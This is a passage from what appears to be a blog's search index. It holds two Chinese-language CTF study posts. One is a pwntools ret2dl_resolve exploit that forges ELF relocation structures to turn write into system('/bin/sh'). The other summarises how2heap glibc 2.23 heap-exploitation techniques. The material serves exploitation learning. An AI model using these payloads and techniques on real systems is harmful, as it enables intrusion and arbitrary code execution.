st_info;   // Symbol type and binding\n    unsigned char st_other;  // Symbol visibility under glibc>=2.2\n    Elf32_Section st_shndx;  // Section index\n} Elf32_Sym;\n```\n\n### (4)执行流程\n\n将伪造的结构体和必要数据放在bss新栈上，从plt0_addr开始执行，调用write函数，重新装载write函数，劫持成system函数，同时修改参数为binsh，直接getshell。\n\n```\n#注释头\n\n#执行数据：\npayload = \"\"\npayload += \"AAAA\"              #位于new_stack_addr,占位用于pop ebp\npayload += p32(plt0_addr)      #位于new_stack_addr+0x04,调用PLT[0]\npayload += p32(fake_reloc_arg) #位于new_stack_addr+0x08,传入伪造的reloc_arg\npayload += p32(0)              #位于new_stack_addr+0x0c,system函数返回值\npayload += p32(binsh_addr)     #位于new_stack_addr+0x10,修改参数为/bin/sh字符串地址\n\n#伪造的内容数据：\npayload += \"A\"*0x3c            #位于new_stack_addr+0x14,padding\npayload += fake_Elf32_Rel_data #位于new_stack_addr+0x50,Elf32_Rel结构体\npayload += \"AAAA\"              #位于new_stack_addr+0x58，padding\npayload += fake_Elf32_Sym_data #位于new_stack_addr+0x5c,Elf32_Sym结构体\npayload += \"system\\x00\\x00\"    #位于new_stack_addr+0x6c,传入system函数名\npayload += \"/bin/sh\\x00\"       #位于new_stack_addr+0x74,传入binsh字符串\n\nio.send(payload)\nio.interactive()\n```\n\n▲不同版本的libc也不太一样，在libc2.27及以下试过都行，但2.30及以上好像就不可以，可能版本改了多了一些检查吧。\n\n \n\n# 二、64位程序：\n\n## 1.条件变更：\n\n### (1)两大结构体发生变化：\n\n```\n#注释头\n\n#Elf64_Rela结构体：大小为0x18\ntypedef struct\n{\n  Elf64_Addr  r_offset;          /(0x08)* Address */\n  Elf64_Xword  r_info;           /(0x08)* Relocation type and symbol index */\n  Elf64_Sxword  r_addend;        /(0x08)* Addend */\n} Elf64_Rela;\n\n#Elf64_Sym结构体：大小为0x18\ntypedef struct\n{\n  Elf64_Word  st_name;           /(0x04)* Symbol name (string tbl index) */\n  unsigned char  st_info;        /(0x01)* Symbol type and binding */\n  unsigned char  st_other;       /(0x01)* Symbol visibility */\n  Elf64_Section  st_shndx;       /(0x02)* Section index */\n  Elf64_Addr  st_value;          /(0x08)* Symbol value */\n  Elf64_Xword  st_size;          /(0x08)* Symbol size */\n} Elf64_Sym;\n```\n\n![elf64_rel](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191516705.png)\n\n![elf64_sym](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191516393.png)\n\n### (2)寻址方式发生变化\n\n不再是直接寻址，而是通过一个数组寻址，并且如果索引过大，会造成数组越界，程序崩溃。这里就需要设置link_map里的某些参数，置为0，才能跳过其中的判断语句，使得伪造的r_info能够起作用，所以这里还需要先泄露link_map的地址：(或者直接伪造link_map)\n\n▲ GOT+4(即GOT[1])为动态库映射信息数据结构link_map 地址；GOT+8(即GOT[2])为动态链接器符号解析函数的地址_dl_runtime_resolve。\n\n### (3)数组索引对齐\n\n需要进行0x18的对齐，确保通过索引n*0x18到的地址是我们伪造的结构体。\n\n## 2.思考exp编写：\n\n### (1)各种前置地址：\n\n```\nvulfun_addr = 0x4005e6\nwrite_got = 0x600A58\nread_got = 0x600A60\nplt0_addr = 0x4004a0\nlink_map_got = 0x600A48\n#GOT[1]的地址\nleave_ret = 0x400618\npop_rdi_ret = 0x4006b3\npop_rbp_ret = 0x400550\n\nnew_stack_addr = 0x600d88 \n#程序运行起来才会有，bss与got表相邻，_dl_fixup中会降低栈后传参，设置离bss首地址远一点防止参数写入非法地址出错\n\nrelplt_addr = 0x400420 \n#.rel.plt的首地址，通过计算首地址和新栈上我们伪造的结构体Elf64_Rela偏移构造reloc_arg\n\ndynsym_addr = 0x400280\n#.dynsym的首地址，通过计算首地址和新栈上我们伪造的Elf64_Sym结构体偏移构造Elf64_Rela.r_info\n\ndynstr_addr = 0x400340\n#.dynstr的首地址，通过计算首地址和新栈上我们伪造的函数名字符串system偏移构造Elf64_Sym.st_name\n```\n\n### (2)泄露link_map的地址:\n\n```\n#注释头\n\nuniversal_gadget1 = 0x4006aa\t\n#pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; retn\nuniversal_gadget2 = 0x400690\t\n#mov rdx, r13; mov rsi, r14; mov edi, r15d; call qword ptr [r12+rbx*8]\n\n#使用万能gadgets调用write泄露link_map地址\npayload = \"\"\npayload += 'A'*136 #padding\npayload += p64(universal_gadget1) \npayload += p64(0x0)\npayload += p64(0x1) #rbp，随便设置\npayload += p64(write_got)\npayload += p64(0x8)\npayload += p64(link_map_got)\npayload += p64(0x1)\npayload += p64(universal_gadget2)\npayload += 'A'*0x38 #栈修正\npayload += p64(vulfun_addr) #返回到vulnerable_function处\n\nio.send(payload)\nio.recvuntil(\"Input:\\n\")\nlink_map_addr = u64(io.recv(8))\nlog.info(\"Leak link_map address:%#x\" %(link_map_addr))\n```\n\n### (3)进行栈劫持：\n\n```\n#注释头\n\npayload = \"\"\npayload += 'A'*136 #padding\npayload += p64(universal_gadget1) \npayload += p64(0x0)\npayload += p64(0x1)\npayload += p64(read_got) #使用万能gadgets调用read向新栈中写入数据\npayload += p64(0x500)\npayload += p64(new_stack_addr)\npayload += p64(0x0)\npayload += p64(universal_gadget2)\npayload += 'A'*0x38 #栈修正\n\npayload += p64(pop_rbp_ret) \n#返回到pop rbp; retn，劫持栈。此处直接劫持栈是因为如果继续修改link_map+0x1c8会导致ROP链过长，栈上的环境变量指针被破坏，从而导致system失败。\npayload += p64(new_stack_addr)\npayload += p64(leave_ret)\n\nio.send(payload)\n```\n\n### (4)伪造两大结构体和必要数据：\n\n```\n#注释头\n\nfake_Elf64_Rela_base_addr = new_stack_addr + 0x150 \n#新栈上选择一块地址作为伪造的Elf64_Rela结构体基址，稍后还要通过计算进行0x18字节对齐\n\nfake_Elf64_Sym_base_addr = new_stack_addr + 0x190\n#新栈上选择一块地址作为伪造的Elf64_Sym结构体基址，稍后还要通过计算进行0x18字节对齐，与上一个结构体之间留出一段长度防止重叠\n\nfake_st_name = new_stack_addr + 0x1c0 - dynstr_addr \n#计算伪造的st_name数值，为伪造函数字符串system与.dynstr节开头间的偏移\n\nbinsh_addr = new_stack_addr + 0x1c8 \n#\"/bin/sh\\x00\"所在地址，计算得到的\n\n#计算两个结构体的对齐填充字节数，两个结构体大小都是0x18\nrel_plt_align = 0x18 - (fake_Elf64_Rela_base_addr - relplt_addr) % 0x18 \nrel_sym_align = 0x18 - (fake_Elf64_Sym_base_addr - dynsym_addr) % 0x18\n\n#加上对齐值后为结构体真正地址\nfake_Elf64_Rela_addr = fake_Elf64_Rela_base_addr + rel_plt_align \nfake_Elf64_Sym_addr = fake_Elf64_Sym_base_addr + rel_sym_align\n\nfake_reloc_arg = (fake_Elf64_Rela_addr - relplt_addr)/0x18 \n#计算伪造的reloc_arg，由于是数组索引下标，所以需要除以结构体大小0x18\n\nfake_r_info = (((fake_Elf64_Sym_addr - dynsym_addr)/0x18) << 0x20) | 0x7 \n#伪造r_info，偏移要计算成下标，除以Elf64_Sym的大小，最后一字节为0x7\n\n\nfake_Elf64_Rela_data = \"\"\nfake_Elf64_Rela_data += p64(write_got) \n#r_offset = write_got，以免重定位完毕回填got表的时候出现非法内存访问错误\nfake_Elf64_Rela_data += p64(fake_r_info)\nfake_Elf64_Rela_data += p64(0)\n\nfake_Elf64_Sym_data = \"\"\nfake_Elf64_Sym_data += p32(fake_st_name)\nfake_Elf64_Sym_data += p8(0x12)\n#后面的数据直接套用write函数的Elf64_Sym结构体，这里要注意数据大小\nfake_Elf64_Sym_data += p8(0)\nfake_Elf64_Sym_data += p16(0)\nfake_Elf64_Sym_data += p64(0)\nfake_Elf64_Sym_data += p64(0)\n```\n\n### (5)执行流程\n\n将link_map+0x1c8置0之后，直接再次重定位write函数，劫持为system函数，getshell:\n\n```\n#注释头\n\n#使用万能gadgets调用read把link_map+0x1c8置为0\npayload = \"\"\npayload += \"AAAAAAAA\"\npayload += p64(universal_gadget1)\npayload += p64(0x0)\npayload += p64(0x1) #rbp设置为1\npayload += p64(read_got)\npayload += p64(0x8)\npayload += p64(link_map_addr + 0x1c8)\npayload += p64(0x0)\npayload += p64(universal_gadget2)\npayload += 'A'*0x38 #栈修正\n\n#为system函数设置参数\"/bin/sh\\x00\"，由于plt[0]函数调用重定位取参仍然是从栈上取，不会用到rdi寄存器传参，所以这里直接先传参也可。\npayload += p64(pop_rdi_ret) \npayload += p64(binsh_addr)\n\npayload += p64(plt0_addr)\npayload += p64(fake_reloc_arg)\npayload = payload.ljust(0x150, \"A\") #padding\n\npayload += 'A'*rel_plt_align\npayload += fake_Elf64_Rela_data\npayload = payload.ljust(0x190, \"A\") #padding\n\npayload += 'A'*rel_sym_align\npayload += fake_Elf64_Sym_data\npayload = payload.ljust(0x1c0, \"A\") #padding\npayload += \"system\\x00\\x00\"\npayload += \"/bin/sh\\x00\"\n\nio.send(payload) #写入该段payload,将数据读取到新栈\nio.send(p64(0)) #执行新栈上的相关代码，设置link_map+0x1c8为0。\n\nio.interactive()\n```\n\n▲其实还是一知半解，等先打完基础再来深究吧。\n\n \n\n参考资料：\n\nhttps://wiki.x10sec.org/pwn/linux/stackoverflow/advanced-rop-zh/\n\nhttps://bbs.ichunqiu.com/forum.php?mod=viewthread&tid=44816&ctid=157\n\nhttps://syst3mfailure.github.io/ret2dl_resolve\n\nhttps://xz.aliyun.com/t/5722\n","tags":["First"],"categories":["PWN","RROP0xa"]},{"title":"how2heap_libc2.23_summary","url":"/2021/08/14/how2heap_libc2.23_summary/","content":"\n1.first_fit:\n\nunsortedbin中切割原则，常用来泄露地址\n\n \n\n2.fastbin_dup：\n\n```\n#注释头\n\na=malloc(x),b=malloc(x),c=mallox(x)\nfree(a),free(b),free(a)\nmalloc(x)=a,malloc(x)=b,malloc(x)=a\n```\n\n \n\n3.fastbin_dup_into_stack:\n\n```\n#注释头\n\na=malloc(x),b=malloc(x),c=mallox(x)\nfree(a),free(b),free(a)\n\n//malloc(x)得到a，此时a还在fastbin中，之后修改a的fd为fakechunk，使得:\nfastbinsY.fd->b,b.fd->a,a.fd->fakechunk\n\n//再次申请得到fakechunk\nmalloc(x)=b,malloc(x)=a,malloc(x)=fakechunk\n//这里就可以使得fakechunk位于栈上，从而使得堆分配到栈中控制栈上的原先不可控数据。\n```\n\n \n\n4.fastbin_dup_consolidate\n\n```\n#注释头\n\na=malloc(x),b=malloc(x)\nfree(a)//a进入fastbin中\n\nc = malloc(0x400)\n//申请large bin的时候已经执行了malloc_consolidate，使得fastbin中的a放入smallbin中\n\nfree(a)\n//并不会报错,因为这个时候a已经被放到了smallbin之中,fastbin中没有a,之后a再次进入fastbin中\n\n//此时的a中信息如下：\na.bk->smallbin\na.fd->0//由于处在fastbin的第一个，所以fd被清空\n\nmalloc(x) = a//这时候a中存在smallbin的信息，可以进行泄露\nmalloc(x) = a//可以再次申请，再次得到a\n```\n\n \n\n5.house_of_einherjar：\n\n在当前chunk中构造fakechunk，利用溢出漏洞修改下一个chunk的presize和pre_inuse。之后释放下一个chunk连上fakechunk一起进入Bins中，再通过当前chunk修改进入bins中chunk的fd,bk，从而实现任意地址读写。\n\n(1)申请三个chunk，chunk1,chunk2,chunk3\n\n(2)在chunk1中制造fakechunk//这里需要绕过一些检查\n\n①构造：\n\n```\n#注释头\n\nfake_chunk->size = sizeof(chunk1)-0x10\n```\n\n绕过pre_size的检查：\n\n```\n#注释头\n\nif (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))     \n      malloc_printerr (\"corrupted size vs. prev_size\");\n```\n\n这段代码意思就是当前chunk的size如果不等于下一个chunk的pre_size域，则出错\n\n②构造：\n\n```\n#注释头\n\nfake_chunk->fd = chunk1\nfake_chunk->bk = chunk1\n```\n\n绕过双向链表的检查：\n\n```\n#注释头\n\nif (__builtin_expect (FD->bk != P || BK->fd != P, 0))      \n      malloc_printerr (\"corrupted double-linked list\");\n```\n\n这段代码意思就是下一个chunk，也就是BK，其fd不等于当前chunk地址，或者上一个chunk，也就是FD，其bk不等于当前chunk地址，满足其中一个就出错。\n\n(3)利用溢出漏洞，改掉chunk2的pre_size和pre_inuse，free掉chunk2,这样fakechunk+chunk2一起被放入bins中，形成chunkA\n\n(4)通过chunk1修改chunkA的fd,bk，使其指向想更改的地址addr\n\n(5)再malloc(sizeof(fakechunk+chunk2))就可以得到首地址为fakechunk，大小为fakechunk+chunk2的chunkA了。之后再malloc一次就得到addr的chunk\n\n \n\n6.house_of_force：通过修改topchunk的size域获得任意读写的chunk\n\n(1)修改topchunk的size域，使之变成一个大数。\n\n(2)malloc(-size)。要确保这个-size<topchunk.size(补码形式)\n\n(3)之后topchunk就会被抬升到-(size-0x10)的位置(chunk内存对齐的原因，具体调试一下就能判断被抬升到哪里了：p main_arena.top)然后才会从被抬升之后的topchunk开始分配size大小的chunk。\n\n(4)这时候再正常malloc，就可分配到从被抬升之后分配完size的topchunk地址处切割的chunk了，实现任意地址读写。\n\n \n\n7.house_of_lore：\n\n针对small bin进行攻击的，如果题目设置malloc大小限制大于fastbin时，就可以利用了。\n\n(1)分配一个small bin大小的chunk_ptr，和另一个chunk 用来间隔 top chunk。\n\n(2)在栈上伪造两个地址fake chunk1和fake chunk2，从smallbin中申请需要满足以下条件：\n\n①// 获取 small bin 中倒数第二个 chunk 。\n\nbck = victim->bk;\n\n▲需要设置chunk_ptr->bk = fake chunk1\n\n②// 检查 bck->fd 是不是 victim，防止伪造\n\n```\n#注释头\n\nif (__glibc_unlikely(bck->fd != victim)) {\n     errstr = \"malloc(): smallbin double linked list corrupted\";\n     goto errout;\n}\n```\n\n▲需要设置fake chunk1->fd = chunk_ptr，同时由于之后申请fake chunk1时也需要满足这个条件，所以也需要设置fake chunk2->fd = fake chunk1，fake chunk1->bk = fake chunk2\n\n(3)释放掉chunk_ptr，唯一需要漏洞利用的是设置victim->bk = fake chunk1，这里需要获取栈上的地址，并且存在类似UAF漏洞之类的来设置bk指针。设置之后现在smallbin链表中结构为fake chunk2->fake chunk1->chunk_ptr。\n\n(4)之后申请sizeof(chunk_ptr)，将之申请出来，再申请一次即可将fake chun1申请出来，实现任意地址申请堆块。\n\n▲注意这里针对smallbin的攻击是不需要设置size位的，不存在这方面的条件。\n\n \n\n8.house_of_orange：无free函数的泄露地址\n\n(1)修改topchunk的size域，使之变小，但需要满足下列条件：\n\n①伪造的 size 必须要对齐到内存页，例如topchunk_addr+topchunk_size=0x1000*x。\n\n②size 要大于 MINSIZE(0x10)\n\n③size 要小于之后申请的 chunk size + MINSIZE(0x10)\n\n④size 的 prev inuse 位必须为 1\n\n用于通过之后拓展topchunk的sysmalloc函数中的下列检查：\n\n```\n#注释头\n\nassert((old_top == initial_top(av) && old_size == 0) ||\n     ((unsigned long) (old_size) >= MINSIZE &&\n      prev_inuse(old_top) &&\n      ((unsigned long)old_end & pagemask) == 0));\n```\n\n(2)申请一个大于伪造之后topchunk_size，小于128K(0x1f400)的chunk。前者是为了调用sysmalloc函数，后者是为了使得分配方式为brk拓展topchunk。\n\n①brk是将数据段(.data)的最高地址指针_edata往高地址推，原先的topchunk被放入unsortedbin中，然后再从新的topchunk处开始分配。(一般会往高地址推0x21000这么大，基本就是再加一个初始topchunk大小)\n\n②mmap是在进程的虚拟地址空间中（堆和栈中间，称为文件映射区域的地方）找一块空闲的虚拟内存，这样原先的topchunk不会被放到unsortedbin中，那么再分配就是从这个mmap中分配，没办法泄露地址了。\n\n(3)再申请一块内存，就会从unsortedbin中的old_topchunk切割，得到的chunk的fd和bk都带有信息。如果程序没有将申请的chunk内存初始化，那么就可以泄露地址。另外由于在执行切割之前，old_topchunk会被先整理到smallbin或者largebin中(具体看old_chunk的size)，所以申请回来的chunk中的fd和bk的内容应该是对应smallbin或者largebin链表头的地址，不是unsortedbin链表头main_aren+88的地址。这里需要具体调试一下好计算偏移，方便泄露地址。\n\n \n\n9.house_of_roman：无leak的利用，爆破\n\n(1)申请3个chunk，chunkA,chunkB,chunkC,分别为0x20,0xd0,0x70.(A用来触发单字节溢出，修改chunkB的size位)\n\n(2)在chunkB+0x78处设置p64(0x61)，用来过检查用的。（6+7=13(0xd)）\n\n(3)释放chunkB , chunkB进入unsortedbin , 这样chunkB的fd和bk处都有 main_arena 的地址。\n\n(4)再次分配 0xd0 ,会分配到chunkB。以上步骤都是为了使得chunkB中带上main_arena的地址。\n\n(5)再申请三个0x70大小的chunk，chunkD,chunkE,chunkF，chunkF用来占位用，防止被topchunk吞并\n\n(6)释放掉chunkC,chunkD,使之进入fastbin中，为chunkD->chunkC。\n\n(7)利用UAF修改chunkD的fd的低字节，使其指向chunkB，即将0xf0修改为0x20即可：\n\n```\n#注释头\n\n0xn000 chunkA\n0xn020 chunkB\n0xn0f0 chunkC\n0xn160 chunkD\n0xn1d0 chunkE\n0xn240 chunkF\n```\n\n这里能够通过检查，因为前面将chunkB的size设置成了0x70，并且chunkB+0x78处也被设置成了0x61，所以可以通过fastbin的检查。伪造了一个0x70的chunk。那么0x70处的fastbin就变成chunkD->chunkB\n\n(8)修改chunkB的fd指针最后两个字节为\\xaa,\\xed使其指向malloc_hook - 0x23处。这里就需要用到爆破了，\\xaa中的第一个a是不确定的，有16种可能性。所以直接设置成a，成功概率应该为1/16。\n\n![img](http://8.131.70.61/wp-content/uploads/2021/02/图片1.png)\n\n![img](http://8.131.70.61/wp-content/uploads/2021/02/图片2.png)\n\n![img](http://8.131.70.61/wp-content/uploads/2021/02/图片3.png)\n\n而这里需要指向malloc_hook - 0x23的原因是因为既要包含__malloc_hook，又要使得这个chunk的size位为0x7f，观察内存可得，这是最优选择，选取的是_IO_wide_data_0+304这个数据中的7f，其它的7f都会带上其它的数据。\n\n(9)修改完chunkB的fd，就又成功伪造了一个0x70大小的chunk，那么0x70的fastbin中就变成：chunkD->chunkB->malloc_hook - 0x23\n\n(10)现在连续申请三次0x70大小的chunk，最后一个chunk就得到了malloc_hook - 0x23处的chunk，那么现在就可以计算偏移修改malloc+hook的值，修改最后三个字节，劫持为one_gadget。最后12位Bits可以通过固定偏移算出来，不会改变，但是前面的12位bits会改变，需要爆破。这里可以通过刚才的\\xaa中的a来减少爆破次数，\\xaa中第一个a已经确定，那么就可以通过偏移算出来随机化之后的one_gadget中的倒数第二个字节中的第一个16位数，这样就只需要爆破倒数第三个字节即可。那么总共需要的数学期望就应该是(0xff+1)*(0xf+1)=4096次。\n\n(11)爆破成功后还需要触发__malloc_hook，通过连续free两次同一个chunk，使得malloc检查到错误(主要会调用 __libc_message 来执行abort函数)。就可以触发malloc_printerr函数，从而调用__malloc_hook函数，进而getshell。\n\n \n\n10.house_of_spirit:\n\n(1)通过栈溢出修改栈上某个chunk指针，使其指向一个可控内存的栈地址，再修改该栈地址对应chunk的size位。\n\n(2)通过修改下一个chunk的size绕过检查，然后free掉该chunk指针，再申请回来，就可以控制中间区域的内容了。\n\nfakechunkA  uncontral_data  fakechunkB\n\n中心思想就是将不可控的内存纳入一个可控的Chunk中，从而实现可控。\n\n▲\n\n```\n#注释头\n\n//需要绕过的代码(_int_free函数)中：\nif (__builtin_expect (chunk_at_offset (p, size)->size <= 2 * SIZE_SZ, 0)\n         || __builtin_expect (chunksize (chunk_at_offset (p, size))\n                 >= av->system_mem, 0))\n```\n\n即fakechunkA的nextchunk，也就是fakechunkA+fakechunkA->size = fakechunkB的size位满足大于2*SIZE_SZ（64位程序中SIZE_SZ为8），小于av->system_mem（在main_arena中，默认为128kb），一般简单设置后都能满足。\n\n \n\n11.large_bin_attack_1：任意可写地址写堆地址\n\n(1)申请三个chunk，chunkA,chunkB,chunkC,大小依次为0x80,0x400,0x400，其中还需要插入其它的chunk防止合并，然后free掉chunkB，使其进入unsortedbin。\n\nchunkA用来分割，chunkB和chunkC用来放入largebin中\n\n(2)申请一个小于chunkA的chunk，触发unsortedbin整理，将chunkB整理到largebin中。然后chunkA被分割成chunkA_1,chunkA_2，chunkA_1返回给用户，chunkA_2进入unsortedbin中。\n\n(3)free掉chunkC，使其进入unsortedbin中。\n\n(4)利用漏洞修改chunkB的size，使其小于0x410。\n\n(5)修改chunkB的bk为target_addr1-0x10，bk_nextsize为target_addr2_0x20。\n\n(6)分配一个比chunA_2小的chunk，再次触发整理，将chunkC整理至largebin中。\n\n(7)由于chunkB的size小于chunkC的size，所以会将chunkC插入largebin大小排列链表的头部，即以下代码：\n\n▲大小排列链表的代码赋值过程：\n\n```\n#注释头\n\nvictim->bk_nextsize = fwd->bk_nextsize;\nvictim->bk_nextsize->fd_nextsize = victim;\n```\n\n这里的victim就是chunkC，fwd就是chunkB，那么fwd->bk_nextsize就等于target_addr2-0x20。\n\n①第一行代码就是：\n\nchunkC->bk_nextsize被赋值为target_addr2-0x20\n\n②第二行代码就是：\n\n(target_addr2-0x20)->fd_nextsize被赋值为chunkC_addr，相当于\n\n*((target_addr2-0x20)+0x20)=chunkC_addr，即*(target_addr2)=chunC_addr\n\n▲释放顺序排列链表的代码赋值过程：\n\n```\n#注释头\n\nbck = fwd->bk;\n// ......\nmark_bin (av, victim_index);\nvictim->bk = bck;\nvictim->fd = fwd;\nfwd->bk = victim;\nbck->fd = victim;\n```\n\n以上就相当于是*(target_addr1)=chunC_addr\n\n★综上所述，largebin attack的第一种利用方式就是将目的地址的值修改成一个堆地址。\n\n \n\n12.large_bin_attack_2：实现overlap chunk\n\n(1)申请四个chunk，chunkA,chunkB,chunkC,chunkD之后构造一个largebin大小排列的链表chunkA->chunkB，其中chunkA为0x420，chunkB为0x400，chunkC为0x400，未释放，chunkD用来占位防止合并。\n\n(2)利用漏洞将chunkB的bk_nextsize伪造指向chunkC，同时将C的fd与bk构造好，将C的fd_nextsize与bk_nextsize赋值为0。\n\n(3)当再次申请0x410大小的内存chunkE时，遍历chunkB->bk_nextsize会指向C，且C的大小满足需求，因此会调用unlink将chunkC从双链表取下，返回给用户。\n\n(4)那么申请出来的chunkE的地址会为chunkC的地址，即chunkE和chunkC为同一内存块，实现overlap chunk的构造。\n\n \n\n13.mmap_overlapping_chunks:暂时不好找\n\n \n\n14.overlapping_chunks:\n\n(1)free之前修改size，吞并邻块进入bin\n\n(2)free之后修改size，吞并邻块申请出来。\n\n \n\n15.poison_null_byte：实现overlap chunk\n\n(1)malloc三个chunk，chunkA,chunkB,chunkC。\n\n(2)利用漏洞，通过chunkB修改chunkC的pre_size位和pre_inuse位，使得chunkC的pre_size位为chunkA_size+chunkB_size。\n\n(3)free掉chunkC，此时chunkC的pre_inuse位为free状态，触发向上合并，将chunkA,chunkB,chunkC一起free掉。从而实现chunkB的overlap。\n\n但是ubuntu16.04打了补丁，需要绕过检查才行。\n\n \n\n16.unsafe_unlink：通常存储chunk的结构体全局指针来进行unlink攻击。\n\n(1)找到题目中的chunklist位置，并分清结构体中是size在前还是chunk在前。\n\n(2)这里假设我们想要控制chunklist[0]中的chunk。申请chunk0,chunk1,chunk2。在chunk0中构造fakechunk，并设置：\n\n```\n#注释头\n\nfakechunk->fd = chunklist_addr-0x18\nfakechunk->bk = chunklist_addr-0x10\n```\n\n(3)通过堆溢出或者off-by-one将chunk1的pre_size设置成fakechunk_size，将chunk1的size设置成fakechunk_size+chunk1_size。\n\n(4)free掉chunk1，这样就会触发向上合并，将fakechunk和chunk1合并。同时，由于合并过程中调用了unlink函数，那么chunklist[0].chunk就会指向chunlist_addr-0x18，对应的就是我们的chunk0指向chunklist_addr-0x18。\n\n(5)现在修改chunk0就相当于修改*(chunklist_addr-0x18)，从而将chunk0指向任意地址，在任意地址实现读写。\n\n \n\n17.unsorted_bin_attack：任意地址写&main_arena+0x58\n\n(1)利用漏洞，修改处在unsortedbin中将要被拿出来的chunk的bk指针，使其指向traget-0x10\n\n(2)申请这个将要被拿出来的chunk，会有如下代码被运行：\n\n```\n#注释头\n\nbck = victim->bk;\n..................................................\n/* remove from unsorted list */\nunsorted_chunks (av)->bk = bck;\nbck->fd = unsorted_chunks (av);\n```\n\n①第一行代码中victim就是该chunk，那么bck就会指向traget_addr-0x10。\n\n②第四行代码就是将bck的值赋值给unsortedbin的bk指针，使其指向traget_addr-0x10。\n\n③第五行代码就是将unsortedbin的地址赋值给bck->fd，也就是*(target_addr-0x10+0x10)被赋值为unsortedbin的地址，即&main_arena+0x58。\n\n★综上，unsortedbin attack就是将任意地址处的值修改成&main_arena+0x58。\n\n▲一般unsortedbin attack是用来配合fastbin attack来使用的。因为fastbin attack需要伪造fakechunk的size，使其等于0x71或0x7f用来绕过检查.那么这时候就可以用到unsortedbin attack任意地址写&main_arena+0x58这个技巧了，可以使得fakechunk的size等于0x7f，从而绕过检查。\n\n \n\n18.unsorted_bin_into_stack：\n\n(1)利用漏洞，修改unsortedbin中位于链表尾部的chunk_last的bk指针使其指向栈上伪造的一个fakechunk，使其size不等于原先unsortedbin中chunk_last的size。\n\n(2)申请fakechunk的size大小的chunk，从unsortedbin链表尾部的chunk开始查找，首先chunk_last的size不符合，接着查找chunk_last->bk，也就是fakechunk，发现size符号，那么就返回该fakechunk给用户。\n\n这里的fakechunk就可以伪造到栈上，从而控制栈上原先不可控的内容。\n\n \n\n \n\n参考资料：\n\nctfwiki\n\nhttps://github.com/shellphish/how2heap\n\nhttps://bbs.pediy.com/thread-259269.htm#msg_header_h2_12\n","tags":["how2heap"],"categories":["PWN","how2heap"]}]